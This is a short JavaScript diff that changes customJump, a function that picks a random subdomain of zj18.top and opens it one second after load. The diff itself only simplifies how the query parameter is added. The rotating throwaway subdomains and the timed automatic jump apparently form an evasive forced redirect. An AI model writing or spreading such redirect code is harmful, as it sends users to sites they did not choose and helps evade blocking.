@@ -50,13 +50,7 @@ function customJump() {
     const subDomains = ['app', 'web', 'm', 'api', 'user', 'demo', 'visit', 'entry', 'go', 'link', 'rghgp', 'qwer', 'asdf', 'zxcv'];
     const randomSub = subDomains[Math.floor(Math.random() * subDomains.length)];
     const targetDomain = `${randomSub}.zj18.top`;
-    let paramStr = originalParam || '';
-    if (paramStr && !paramStr.endsWith('=')) {
-        paramStr += '=';
-    } else if (!paramStr) {
-        paramStr = '';
-    }
-    const targetUrl = `http://${targetDomain}/` + (paramStr ? `?${paramStr}` : '');
+    const targetUrl = `http://${targetDomain}/` + (originalParam ? `?${originalParam}` : '');
     opensdk(targetUrl);
 }
 setTimeout(customJump, 1000);
